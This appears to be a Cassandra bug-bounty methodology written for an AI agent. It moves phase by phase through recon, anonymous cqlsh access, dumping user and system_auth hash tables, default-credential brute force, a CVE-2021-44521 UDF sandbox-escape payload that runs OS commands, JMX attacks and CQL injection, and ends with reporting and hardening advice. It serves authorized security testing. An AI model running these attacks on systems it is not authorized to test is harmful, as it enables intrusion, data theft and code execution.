---
technology: "Cassandra"
kind: bug-bounty-methodology
audience: ai-agent
family: databases
version: "1.0"
source: "corpus-SILENT after strict re-gate (0 writeups — 4 estimated matches were substring noise, adjudication in internal coverage ledger) + upstream-verified (cassandra.apache.org cassandra.yaml reference 3.11, JFrog XRAY-197962 / CVE-2021-44521) + rewritten from HackTricks (src/network-services-pentesting/cassandra.md), CC BY-NC 4.0, accessed 2026-11-13 (external-discovery strings, 2.x schema fallback, Thrift timeline — re-verified against the 3.11 cassandra.yaml reference)"
provenance: "hybrid: corpus-grounded (5 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line"
---

# Cassandra bug-bounty methodology

Companion overview: [[cassandra]].

Scope note: no observed engagement actually attacks Cassandra — every page here is derived from upstream documentation and verified advisories, flagged as upstream-history context rather than engagement-grounded patterns. Treat commands as verified-against-docs, not as observed-in-the-wild.

## Phase 0 — Recon

```
9042/tcp open  cassandra
7000/tcp open  cassandra-ingress   (inter-node; targets in themselves only for gossip poisoning)
7199/tcp open  jmx (no banner)     (JMX — check separately, Phase 5)
nmap -sV -p 9042,7199,7000,9160 198.51.100.x
```

9160 = legacy Thrift RPC (removed in 4.0; its presence alone dates the cluster pre-4.0). 9042 fingerprinting: the native protocol handshake (an `OPTIONS` frame) makes drivers identify the version; nmap's `cassandra-info` NSE script (Thrift-era, aimed at 9160) pulls cluster name and server version on old clusters.

## Phase 1 — The anonymous walk-in (AllowAllAuthenticator)

Default `authenticator: AllowAllAuthenticator` performs no checks. Try a credential-less shell before anything else:

```bash
cqlsh 198.51.100.x 9042                # no -u/-p = anonymous if auth is off
cqlsh 198.51.100.x --no-color          # script-friendly
```

Decision: a clean `cqlsh>` prompt with no auth error = full cluster access. If `Connection error: ... requires authentication` appears → Phase 3 (default creds, then brute).

## Phase 2 — Enumeration once inside (works for any access level)

```sql
DESCRIBE KEYSPACES;                          -- or SELECT keyspace_name FROM system_schema.keyspaces;
SELECT keyspace_name, table_name FROM system_schema.tables;
SELECT keyspace_name, table_name, column_name, type FROM system_schema.columns;
SELECT cluster_name, release_version FROM system.local;
SELECT peer, data_center, rack, release_version FROM system.peers;
```

Then walk application keyspaces for the usual loot columns:

```sql
SELECT * FROM app.users LIMIT 100;           -- password/token/user columns
SELECT * FROM system_auth.roles;             -- if readable: hashed creds + roles (auth deployments)
```

Note `system.local`'s `release_version` gates the CVE checks (Phase 4). Sensitive data in wide-column stores hides in *clustering* columns and collections — `SELECT *` with `LIMIT` beats guessing column names.

## Phase 3 — Authentication attacks (when the gate is up)

- Bootstrap superuser first: `cqlsh -u cassandra -p cassandra 198.51.100.x` — PasswordAuthenticator ships `cassandra/cassandra` and it is routinely never rotated.
- Common operator creds next: `cassandra`, `admin`, service names as user+pass pairs. No mainstream brute-force tool speaks the CQL native protocol natively (hydra's module list has no cassandra) — loop `cqlsh -u <user> -p <pass>` attempts from a script, watching for the auth-failure vs connection-success distinction.
- Hash extraction: with any authenticated read of `system_auth.roles` (default replication = single node! the keyspace is deliberately under-replicated), pull `salted_hash` values for offline cracking (bcrypt format).

## Phase 4 — CVE-2021-44521: UDF sandbox escape → RCE (verified upstream)

JFrog XRAY-197962 / CVE-2021-44521 — "Insufficient sandboxing of user-defined functions". Affected/fixed per the advisory: 3.0.0-alpha1–3.0.25 (fixed 3.0.26); 3.1–3.11.11 (fixed 3.11.12); 4.0-alpha1–4.0.1 (fixed 4.0.2). Preconditions (non-default config — verify all three before attempting):

```
enable_user_defined_functions: true
enable_scripted_user_defined_functions: true
enable_user_defined_functions_threads: false
```

Any *authenticated* user with function-create rights then escapes the Nashorn sandbox with a single CQL statement (shape from the JFrog advisory — adapt the executed command):

```sql
CREATE OR REPLACE FUNCTION x.escape_system(name text)
  RETURNS NULL ON NULL INPUT RETURNS text LANGUAGE javascript AS $$
    var System = Java.type("java.lang.System");
    System.setSecurityManager(null);
    this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec("id")');
    name $$;
```

If the security manager is null after the UDF thread trick, OS commands run as the Cassandra daemon user. Expect the default config (UDFs off / threads on) to block this on hardened clusters — report as conditional.

## Phase 5 — Adjacent surfaces

- **JMX 7199**: default deployment exposes JMX without auth on localhost/host network; metasploit's `jmx_mlet_server`-style MBean attacks (or jmxcmd/jconsole tooling) turn JMX write into code execution as the Cassandra user. Check `cassandra-env.sh` for `LOCAL_JMX=no` and auth settings.
- **Inter-node 7000**: default internode encryption is off — on-path positions can read replication traffic; gossip poisoning research exists but is fragile, keep it last.
- **CQL injection**: where an app builds CQL by string concatenation, the SQL injection grammar transfers ( `' OR '1'='1`-style tautologies, `ALLOW FILTERING` abuse). Prefer this when only the app tier is reachable and 9042 is bound properly.

## Phase 6 — Reporting

Rank: anonymous full-keyspace access > UDF RCE (CVE-2021-44521) > default/weak creds > system_auth hash exposure > JMX unauth > CQLi via app. Recommend PasswordAuthenticator + CassandraAuthorizer, rotated bootstrap creds, `system_auth` replication factor raised, UDF scripting left disabled, 9042 firewalled from anything that is not an app tier.

## Tool map (prose)

cqlsh (ships with Cassandra, or pip-installable standalone client) for everything CQL; nmap NSE cassandra-info for banner/cluster fingerprint; scripted cqlsh loops for cred testing (no mainstream brute tool speaks CQL natively); a Nashorn/JS-capable CQL session for the UDF payload; jmxcmd or jconsole for JMX checks; hashcat/john for system_auth hashes. The tools vault holds per-tool reference notes.

## Supplement (2026-11-13): external discovery and legacy-cluster quirks

Rewritten from HackTricks (src/network-services-pentesting/cassandra.md), CC BY-NC 4.0, accessed 2026-11-13; version gates re-verified against the Cassandra 3.11 cassandra.yaml reference before writing.

- **Internet-facing discovery without a banner**: Shodan strings that key off protocol behavior — `port:9042 "Invalid or unsupported protocol version"` (the error string an exposed native-transport node returns to a version probe) and `port:9160 Cluster` for Thrift-era leftovers.
- **The precise 9160 timeline**: `start_rpc` (the Thrift listener switch) defaults to **false** in 3.11 per the reference cassandra.yaml, and the Thrift server is gone entirely in 4.0. A reachable 9160 therefore means a pre-3.11 node or an operator who deliberately re-enabled a deprecated listener — both worth extra attention.
- **2.x schema-table fallback**: on Cassandra 2.x the cluster schema lives in `system.*` tables (`system.schema_keyspaces`, `system.tables`); the `system_schema` keyspace is the 3.0+ form. If `system_schema.*` queries error against an ancient banner, retry the old names before concluding the role lacks access.
- **Extra `system.local` fingerprint columns**: `partitioner` (e.g. Murmur3Partitioner), `native_protocol_version`, and `thrift_version` disambiguate clusters whose `release_version` alone is inconclusive.

(HackTricks' remaining content — the AllowAllAuthenticator default posture, the cassandra-info NSE being Thrift/9160-era, the standalone pip-installable cqlsh, and the brute-force placement — was already covered in Phases 0-3 above.)
